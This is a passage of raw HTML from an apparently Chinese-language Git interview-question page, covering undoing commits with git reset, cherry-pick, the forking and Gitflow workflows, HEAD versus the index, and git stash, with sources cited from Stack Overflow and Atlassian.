class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit reset --hard HEAD~1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1cdf6841693866-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1cdf6841693866-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">reset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">hard </span><span class=\"crayon-v\">HEAD</span><span class=\"crayon-o\">~</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<p>现在 B 是 HEAD，因为你使用了 <code>--hard</code>，所以你的文件将重置到提交 B 时的状态。</p>\n<ul>\n<li>要撤销提交但保留更改：</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1cdfb150442588\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit reset HEAD~1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1cdfb150442588-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1cdfb150442588-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">reset </span><span class=\"crayon-v\">HEAD</span><span class=\"crayon-o\">~</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在我们告诉 Git 将 HEAD 指针移回（后移）一个提交（B），并保留文件原样，然后你可以 <code>git status</code> 来显示你已经检入 C 的更改。</p>\n<ul>\n<li>撤销提交但保留文件和索引：</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1cdff445316885\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit reset --soft HEAD~1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1cdff445316885-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1cdff445316885-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">reset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">soft </span><span class=\"crayon-v\">HEAD</span><span class=\"crayon-o\">~</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>执行此操作后，<code>git status</code>，你讲看到索引中的文件跟以前一致。</p>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/927358/how-to-undo-the-most-recent-commits-in-git\">stackoverflow.com</a></p>\n<h3></h3>\n<h3>Q5: 什么是“git cherry-pick”？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<p>命令 <code>git cherry-pick</code> 通常用于把特定提交从存储仓库的一个分支引入到其他分支中。常见的用途是从维护的分支到开发分支进行向前或回滚提交。</p>\n<p>这与其他操作（例如：合并（merge）、变基（rebase））形成鲜明对比，后者通常是把许多提交应用到其他分支中。</p>\n<p>小结：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce03961208570\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit cherry-pick &lt;commit-hash&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce03961208570-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce03961208570-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">cherry</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">pick</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">commit</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">hash</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/9339429/what-does-cherry-picking-a-commit-with-git-mean\">stackoverflow.com</a></p>\n<p> </p>\n<h3>Q6: 解释 Forking 工作流程的优点</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<p><strong>Forking 工作流程 </strong>与其他流行的 Git 工作流程有着根本的区别。它不是用单个服务端仓库充当“中央”代码库，而是为每个开发者提供自己的服务端仓库。Forking 工作流程最常用于公共开源项目中。</p>\n<p>Forking 工作流程的<strong>主要优点</strong>是可以汇集提交贡献，又无需每个开发者提交到一个中央仓库中，从而实现干净的项目历史记录。开发者可以推送（push）代码到自己的服务端仓库，而只有项目维护人员才能直接推送（push）代码到官方仓库中。</p>\n<p>当开发者准备发布本地提交时，他们的提交会推送到自己的公共仓库中，而不是官方仓库。然后他们向主仓库提交请求拉取（pull request），这会告知项目维护人员有可以集成的更新。</p>\n<p>🔗<strong>来源：</strong> <a href=\"https://www.atlassian.com/git/tutorials/comparing-workflows/forking-workflow\">atlassian.com</a></p>\n<p> </p>\n<h3>Q7: 告诉我 Git 中 HEAD、工作树和索引之间的区别？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<ul>\n<li>该<strong>工作树/工作目录/工作空间</strong>是你看到和编辑的（源）文件的目录树。</li>\n<li>该<strong>索引/中转区（staging area）</strong>是个在 <code>/.git/index</code>，单一的、庞大的二进制文件，该文件列出了当前分支中所有文件的 SHA1 检验和、时间戳和文件名，它不是个带有文件副本的目录。</li>\n<li><strong>HEAD</strong>是当前检出分支的最后一次提交的引用/指针。</li>\n</ul>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/3689838/whats-the-difference-between-head-working-tree-and-index-in-git\">stackoverflow.com</a></p>\n<p> </p>\n<h3>Q8: 你能解释下 Gitflow 工作流程吗？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<p>Gitflow 工作流程使用两个并行的、<strong>长期运行</strong>的分支来记录项目的历史记录，分别是 <code>master</code> 和 <code>develop</code> 分支。</p>\n<ul>\n<li><strong>Master</strong>，随时准备发布线上版本的分支，其所有内容都是经过全面测试和核准的（生产就绪）。\n<ul>\n<li><strong>Hotfix</strong>，维护（maintenance）或修复（hotfix）分支是用于给快速给生产版本修复打补丁的。修复（hotfix）分支很像发布（release）分支和功能（feature）分支，除非它们是基于 <code>master</code> 而不是 <code>develop</code> 分支。</li>\n</ul>\n</li>\n<li><strong>Develop</strong>，是合并所有功能（feature）分支，并执行所有测试的分支。只有当所有内容都经过彻底检查和修复后，才能合并到 <code>master</code> 分支。\n<ul>\n<li><strong>Feature</strong>，每个功能都应留在自己的分支中开发，可以推送到 <code>develop</code> 分支作为功能（feature）分支的父分支。</li>\n</ul>\n</li>\n</ul>\n<p><a href=\"https://res.cloudinary.com/practicaldev/image/fetch/s--pLQxGakq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://wac-cdn.atlassian.com/dam/jcr:61ccc620-5249-4338-be66-94d563f2843c/05%2520%282%29.svg%3FcdnVersion%3Dji\"><img src=\"https://res.cloudinary.com/practicaldev/image/fetch/s--pLQxGakq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://wac-cdn.atlassian.com/dam/jcr:61ccc620-5249-4338-be66-94d563f2843c/05%2520%282%29.svg%3FcdnVersion%3Dji\" alt=\"Gitflow workflow\"></a></p>\n<p>🔗<strong>来源：</strong> <a href=\"https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow\">atlassian.com</a></p>\n<p> </p>\n<h3>Q9: 什么时候应使用 “git stash”？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<p><code>git stash</code> 命令把你未提交的修改（已暂存（staged）和未暂存的（unstaged））保存以供后续使用，以后就可以从工作副本中进行还原。</p>\n<p>回顾：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce08274053231\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git status\r\nOn branch master\r\nChanges to be committed:\r\nnew file: style.css\r\nChanges not staged for commit:\r\nmodified: index.html\r\n$ git stash\r\nSaved working directory and index state WIP on master: 5002d47 our new homepage\r\nHEAD is now at 5002d47 our new homepage\r\n$ git status\r\nOn branch master\r\nnothing to commit, working tree clean</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce08274053231-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce08274053231-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-2\"><span class=\"crayon-e\">On </span><span class=\"crayon-e\">branch </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-3\"><span class=\"crayon-e\">Changes </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-v\">committed</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-4\"><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">style</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">css</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-5\"><span class=\"crayon-e\">Changes </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">staged </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">commit</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-6\"><span class=\"crayon-v\">modified</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">html</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">stash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-8\"><span class=\"crayon-e\">Saved </span><span class=\"crayon-e\">working </span><span class=\"crayon-e\">directory </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">index </span><span class=\"crayon-e\">state </span><span class=\"crayon-e\">WIP </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5002d47</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">our </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">homepage</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-9\"><span class=\"crayon-e\">HEAD </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now </span><span class=\"crayon-i\">at</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5002d47</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">our </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">homepage</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-10\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce08274053231-11\"><span class=\"crayon-e\">On </span><span class=\"crayon-e\">branch </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce08274053231-12\"><span class=\"crayon-e\">nothing </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">commit</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">working </span><span class=\"crayon-e\">tree </span><span class=\"crayon-v\">clean</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>我们可以使用暂存（stash）的一个地方是，如果我们发现在上次提交中忘记了某些内容，并且已经开始在同一分支中处理下一个提交了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1ce0c584843318\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# Assume the latest commit was already done\r\n# start working on the next patch, and discovered I was missing something\r\n\r\n# stash away the current mess I made\r\n$ git stash save\r\n\r\n# some changes in the working dir\r\n\r\n# and now add them to the last commit:\r\n$ git add -u\r\n$ git commit --ammend\r\n\r\n# back to work!\r\n$ git stash pop</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1ce0c584843318-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1ce0c584843318-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-1\"><span class=\"crayon-p\"># Assume the latest commit was already done</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-2\"><span class=\"crayon-p\"># start working on the next patch, and discovered I was missing something</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-4\"><span class=\"crayon-p\"># stash away the current mess I made</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">stash </span><span class=\"crayon-v\">save</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-7\"><span class=\"crayon-p\"># some changes in the working dir</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-8\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670e1ce0c584843318-9\"><span class=\"crayon-p\"># and now add them to the last commit:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1ce0c584843318-10\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">add</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span></div><div class=\"crayon-line\" 